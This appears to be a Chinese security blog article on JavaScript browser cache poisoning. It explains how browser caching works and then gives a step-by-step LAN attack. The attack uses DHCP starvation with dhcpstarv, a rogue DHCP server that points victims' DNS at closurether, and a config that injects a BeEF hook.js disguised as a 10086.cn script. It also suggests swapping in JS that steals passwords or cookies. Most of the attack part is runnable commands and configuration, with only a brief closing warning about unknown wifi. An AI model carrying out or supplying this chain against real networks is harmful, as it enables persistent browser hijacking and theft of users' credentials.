# Javascript缓存投毒学习与实战

0x00 起因
=======

* * *

不久前@三好学生师傅买了一个wooyun wifi,然后聊到了缓存投毒：

![Alt text](http://drops.javaweb.org/uploads/images/751d8aa18fd04e00e3c725a172248d4cf7adae06.jpg)

然后看到wooyun wifi的这个说明：

> 默认情况下该功能附带缓存投毒功能，将视图缓存所有的页面至2099年，您可以通过清除所有缓存以及浏览器数据来清除缓存投毒的影响。

觉得这是个很不错的技术，所以查询谷爷，度娘，拜读了@EtherDream 大牛写的文章以后，就有了这篇文章，也算是一个总结。

0x01 简介&原理
==========

* * *

js缓存投毒说白了就是受害者的浏览器缓存了一个被我们篡改的js脚本，如果缓存没有被清除，每次这个受害者访问网页的时候都会加载我们的js脚本。

那他是什么原理呢，很简单，其实就是浏览器的缓存机制，通常，为了加速各种静态资源的访问，各大网站会把一些静态资源缓存到客户端，这样一方面能提高客户体验，一方面也能减轻web服务器的压力。

浏览器缓存控制机制有两种：HTML Meta标签 以及 HTTP头信息，通常，web开发者可以在HTML页面的`<head>`节点中加入`<meta>`标签，比如：

```
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">

```

代码的作用是告诉浏览器当前页面不被缓存，每次访问都需要去服务器拉取。 更多浏览器缓存机制我就不多说了，详情请[戳我](https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=0&rsv_idx=1&tn=94093035_hao_pg&wd=%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6&rsv_pq=bda55a250000c01c&rsv_t=16c2REa31Ph2fOrx%2FvVo1EA1TZnUrNu0SMr6RKlUQoSfgPoQSEQ4lMtfbPnlNP3IIirnlUYn&rsv_enter=1&rsv_sug3=28&rsv_sug1=21)。

要想预加载并缓存一个脚本很容易，只需`new Image().src=''`。当然有少数浏览器不支持，不过ie和chrome都是支持的。尽管js文件并不是一个图片，但仍然会缓存。

0x02 准备工作
=========

* * *

**安装node**

```
wget https://codeload.github.com/nodejs/node/zip/master -O node-master.zip //下载
tar zxvf node-master.zip //解压
cd node-master
./configure
make //编译
make install //安装

```

**安装closurether**

```
npm install -g closurether

```

**安装phantomjs**

下载安装，具体详见[phantomjs](http://phantomjs.org/download.html),根据自己的系统进行选择。

0x03 示例
=======

* * *

测试过程中，使用了EtherDream大牛的[demo](https://github.com/EtherDream/mitm-http-cache-poisoning)。具体过程如下。

下载安装：

```
root@kali:~/Desktop/# git clone https://github.com/EtherDream/mitm-http-cache-poisoning.git js
root@kali:~/Desktop/# cd js
root@kali:~/Desktop/js/# npm install

```

更新缓存列表

```
root@kali:~/Desktop/js# cd tool/
root@kali:~/Desktop/js/tool# phantomjs sniffer.js -i url.txt -o target.json

```

![Alt text](http://drops.javaweb.org/uploads/images/4351f832ddb3d36536ebd720f7bad22e11778b11.jpg)

这个脚本的作用主要是为了找出各大网站中缓存最久的脚本资源，也就是我们要进行投毒的脚本链接。网站可以再url.txt里面添加，之后将生成的json复制到 asset 目录。

```
root@kali:~/Desktop/js/tool# cp -fr target.json ../asset/

```

运行

```
root@kali:~/Desktop/js/tool# cd ..
root@kali:~/Desktop/js# node index.js 

```

测试：

> 浏览器代理 HTTP -> 127.0.0.1:8080 访问任意 HTTP。

![Alt text](http://drops.javaweb.org/uploads/images/fa3b46c2400bd12c678c827ffbd8e2617722b70b.jpg)

> 关闭代理 打开126，360等网站（chrome测试成功，火狐失败）成功弹框。

![Alt text](http://drops.javaweb.org/uploads/images/52cd64132e9df584e40a25dd50f513cada835466.jpg)

关闭浏览器（不清除缓存），再次打开，访问360时依然会弹框。

其中，index.js实现了代理并替换原本静态脚本响应内容，并将响应头中[Cache-Control](http://baike.baidu.com/link?url=3QihY_fgx_CczpXn4NaaqfWzkaW9R77Fwt9CzzJ07kS26WG6N4eXRuwEB43a8TIXC5okH96u5CdCN8eEw-Eq1K)字段改为`max-age=31536000`,如下图代码：

![Alt text](http://drops.javaweb.org/uploads/images/82f7d0ef560ba0975a8b5d8424b4755d6a65822a.jpg)

而替换的脚本为asset目录下的stub.js，stub.js注入外部js关键代码如下图：

![Alt text](http://drops.javaweb.org/uploads/images/07a7681357ea471f44f384d18cae596fe456e140.jpg)

其中`www.etherdream.com/hack/trojan.js`为我们可控的js，上例中该js的内容为

```
alert('xss run: ' + location.href);

```

我们可以通过修改该脚本内容来实现不同的功能。

0x04 实战
=======

* * *

此次实战在局域网中结合使用了dhcpstarv,isc-dhcp-server,beef以及closurether。攻击机使用了kali2.0。

**1.开启beef**

```
root@kali:~# cd /usr/share/beef-xss/
root@kali:/usr/share/beef-xss# ./beef

```

**2.配置closurether**

获取最新的缓存列表

```
root@kali:~# cd /usr/local/lib/node_modules/closurether/tool/cache-sniffer
root@kali:/usr/local/lib/node_modules/closurether/tool/cache-sniffer#  phantomjs sniffer.js

```

可以通过修改url.txt的内容来指定网站，此次测试过程中url中包含126以及360几个网站。 配置config.json文件如下:

```
{
        "hacker_url": "http://192.168.1.108:3000/hook.js",
        "inject_url": "http://10086.cn/js10086/201306301200.js",
        "debug": false,
        "dump": false,
        "dumpPath": "./dump/"
}

```

其中`hacker_url`为我们的js地址，此处为beef的js地址，`inject_url`为伪装的js地址。

运行closurether：

```
root@kali:~# closurether
[SYS] local ip: 192.168.1.108
[DNS] running 0.0.0.0:53
[WEB] listening :::80
[WEB] listening :::443

```

**2.进行dhcp攻击**:

下载[dhcpstarv](http://sourceforge.net/projects/dhcpstarv/files/dhcpstarv/0.2.1/dhcpstarv-0.2.1.tar.gz/download),安装：

```
root@kali:~/Desktop# tar zxvf dhcpstarv-0.2.1.tar.gz
root@kali:~/Desktop# cd dhcpstarv-0.2.1/
root@kali:~/Desktop/dhcpstarv-0.2.1# ./configure
root@kali:~/Desktop/dhcpstarv-0.2.1# make 
root@kali:~/Desktop/dhcpstarv-0.2.1# make install

```

> Kali默认没有安装dhcpstarv，也可以用yersinia代替

安装dhcp服务器：

```
root@kali:~# apt-get install isc-dhcp-server

```

修改dhcp配置文件dhcpd.conf

```
root@kali:~# cd /etc/dhcp/
root@kali:/etc/dhcp# cp dhcpd.conf dhcpd.conf.bak
root@kali:/etc/dhcp# vim dhcpd.conf

```

修改DHCP分配的地址池，修改默认路由为原来路由的Ip，修改广播地址：

![Alt text](http://drops.javaweb.org/uploads/images/22b152515fef2c09e13cf95af13609b9e984d9ef.jpg)

设置dns为开启了closurether的地址，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/60ea1d14248586eee8eefe4fae90d8082436b178.jpg)

> 这里最好加一个正常的DNS服务器地址最为备选，防止我们的DNS服务对部分域名不解析

开启操作系统的路由转发：

```
root@kali:~# echo "1" > /proc/sys/net/ipv4/ip_forward

```

启动DHCP服务：

```
root@kali:/etc/dhcp# service isc-dhcp-server start

```

攻击正常的dhcp服务器，耗光ip资源:

```
root@kali:~# dhcpstarv -i eth0 -e 192.168.1.108

```

> `-e参数`后面跟攻击者的ip

![Alt text](http://drops.javaweb.org/uploads/images/cde6c8a8fb7bb02dbc4c89f0026767a492cd9892.jpg)

然后当有客户端连入的时候，由于正常的DHCP服务器已经没有可分配的IP资源，新的内网主机就会使用攻击者DHCP服务器分配的IP，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/b4baa9be0ff3117a196349966b62990d2981bf32.jpg)

可以看到DNS已经改成了我们想要改的地址。

> 这里说明下，如果可以直接进路由修改DNS，就直接进路由改，这样比较稳定，修改DNS为我们运行closurether的地址。

主要工具运行截图：

![Alt text](http://drops.javaweb.org/uploads/images/b79750190007cc1dc2462dc92fe6217a49dea6d1.jpg)

这时，被篡改DNS的客户端浏览网站的时候，就会运行我们植入的JS脚本，打开126以后，可以看到beef那里已经成功上线了：

![Alt text](http://drops.javaweb.org/uploads/images/335adf0092d70e3daf006dd8a3e83b85e6004518.jpg)

而我们的js则已经被隐藏为10086的js

![Alt text](http://drops.javaweb.org/uploads/images/1f7e80541edb529fb48655ecd503e12ebaf436eb.jpg)

将路由器重启，使用正常的DHCP为虚拟机分配ip地址，使用浏览器（未清理缓存）打开360：

![Alt text](http://drops.javaweb.org/uploads/images/9c7c93e4b95162a42c2ed4827bbb603629175dc7.jpg)

这时可以看到beef上又上线了：

![Alt text](http://drops.javaweb.org/uploads/images/6f4ad2412a1372d90bf7a7c5cf662ce8dbbb789e.jpg)

> beef的功能很强大，但不是本文的重点，当然js也可以换成其他，别如窃取某些网站的账号密码的js，或者获取客户端cookie的等等，这里就不多说了

这样就达到了时光机的效果，虽然上网环境换了，但是由于浏览器的缓存没有清除，任然会执行我们的js，至此整个攻击完成。

0x05 总结
=======

* * *

从上面的整个过程可以得出的结论就是`不要随意通过不认识的wifi上网！`

本文由evi1cg原创并首发于乌云drops，转载请注明